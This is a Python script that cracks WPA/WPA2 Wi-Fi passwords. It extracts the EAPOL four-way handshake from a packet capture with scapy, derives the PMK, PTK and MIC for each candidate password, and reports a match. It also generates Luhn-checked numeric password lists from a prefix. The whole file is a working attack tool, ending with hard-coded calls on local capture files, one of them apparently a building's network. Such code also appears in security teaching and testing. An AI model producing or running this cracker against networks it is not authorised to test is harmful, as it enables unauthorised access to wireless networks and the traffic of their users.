from scapy.all import *
import binascii
import hashlib
import hmac
import scapy.packet
import sys
from typing import *

def get_handshake(packets: PacketList) -> List[scapy.packet]:
    handshake = []
    for packet in packets:
        if scapy.all.EAPOL in packet:
            handshake.append(packet)
    return handshake

def mac_string_to_bytes(mac_string: str) -> bytes:
    return binascii.unhexlify(mac_string.replace(":","", 5))

def get_eapol_bytes(packet: scapy.packet) -> bytes:
    return bytes(packet[EAPOL])

def extract_nonces(handshake_data: List[bytes]) -> Tuple[bytes, bytes]:
    NONCE_OFFSET = 17
    NONCE_LENGTH = 32
    NONCE_END = NONCE_OFFSET + NONCE_LENGTH
    anonce_packet_data = handshake_data[0]
    snonce_packet_data = handshake_data[1]
    anonce = anonce_packet_data[NONCE_OFFSET : NONCE_END]
    snonce = snonce_packet_data[NONCE_OFFSET : NONCE_END]
    return anonce, snonce

def get_mic_frame(handshake_data: List[bytes]) -> bytes:
    mic_frame = handshake_data[1]
    mic_frame = mic_frame[:81] + b"\x00" * 16 + mic_frame[97:]
    return mic_frame

def get_key_data(ap_mac: bytes, cl_mac: bytes, anonce: bytes, snonce: bytes) -> bytes:
    mac_addresses_pair = b"".join(sorted([ap_mac, cl_mac]))
    nonce_pair = b"".join(sorted([anonce, snonce]))
    key_data = mac_addresses_pair + nonce_pair
    return key_data

def get_mic(handshake_data: List[bytes]) -> bytes:
    MIC_OFFSET = 81
    MIC_LENGTH = 16
    MIC_END = MIC_OFFSET + MIC_LENGTH
    mic_packet_data = handshake_data[1]
    mic = mic_packet_data[MIC_OFFSET : MIC_END]
    return mic

def calc_pmk(ssid: bytes, password: bytes) -> bytes:
    pmk = hashlib.pbkdf2_hmac('sha1', password, ssid, 4096, 32)
    return pmk

def calc_ptk(pmk: bytes, key_data: bytes) -> bytes:
    pke = b"Pairwise key expansion"
    blen = 64
    i = 0
    ptk = b""

    while len(ptk) < blen:
        hmacsha1 = hmac.new(pmk, pke + b"\x00" + key_data + bytes([i]), hashlib.sha1)
        ptk += hmacsha1.digest()
        i += 1

    return ptk[:blen]

def calc_mic(ptk: bytes, mic_frame: bytes) -> bytes:
    mic = hmac.new(ptk[0:16], mic_frame, "sha1").digest()
    return mic[:-4]

def crack_handshake(ap_ssid: str, handshake: List[scapy.packet], password_list, debug = False) -> None:
    handshake_data = [get_eapol_bytes(packet) for packet in handshake]
    ap_mac = mac_string_to_bytes(handshake[0].addr2)
    cl_mac = mac_string_to_bytes(handshake[0].addr1)
    anonce, snonce = extract_nonces(handshake_data)
    key_data = get_key_data(ap_mac, cl_mac, anonce, snonce)
    mic = get_mic(handshake_data)
    mic_frame = get_mic_frame(handshake_data)

    for password in password_list:
        pmk = calc_pmk(ap_ssid.encode('ascii'), password.encode('ascii'))
        ptk = calc_ptk(pmk, key_data)
        new_mic = calc_mic(ptk, mic_frame)

        if new_mic == mic:
            print("[+] Found a key!")
            print("[+] Password : ", password)
            print("[+] PMK : ", pmk.hex())
            print("[+] PTK : ", ptk.hex())
            print("[+] MIC : ", new_mic.hex())
        elif debug:
            print("[-] Checked password does not match :(")
            print("[?] Checked password : ", password)
            print("[?] Calculated PMK : ", pmk.hex())
            print("[?] Calculated PTK : ", ptk.hex())
            print("[?] Calculated MIC : ", new_mic.hex())
            print("[?] Actual MIC     : ", mic.hex())

def crack_eapol(ap_ssid: str, pcap_filename: str, password_list, debug = False):
    packets = rdpcap(pcap_filename)
    crack_handshake(ap_ssid, get_handshake(packets), password_list, debug)

def get_password_list(prefix: str):
    
    def luhn_correct_bit(first_digits):
        res = 0
        i = 0
        for dig in first_digits:
            val = int(dig)
            if i % 2 == 1:
                if val >= 5:
                    res += 2*val - 9
                else:
                    res += 2*val
            else:
                res += val
            i += 1
        return str((10 - res) % 10)
    remaining_digits = 8 - len(prefix)
    for i in range(10 ** remaining_digits):
        first_digits = prefix + str(i).zfill(remaining_digits)
        check_digit = luhn_correct_bit(first_digits)
        res = first_digits + check_digit
        yield res

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: ", sys.argv[0], "<beacon ssid> <pcap filename> <password prefix>")
    ssid = sys.argv[1]
    filename = sys.argv[2]
    password_prefix = sys.argv[3]
    password_list = get_password_list(password_prefix)
    crack_eapol(ssid, filename, password_list)
#crack_eapol("Building_G2", "/home/yuval/pcap/res.pcap-01.cap", ["not_password", "password", "123456789"])
crack_eapol("Test_AP", "/home/yuval/Downloads/handshake-Test_AP.pcap", ["not_password", "password"])
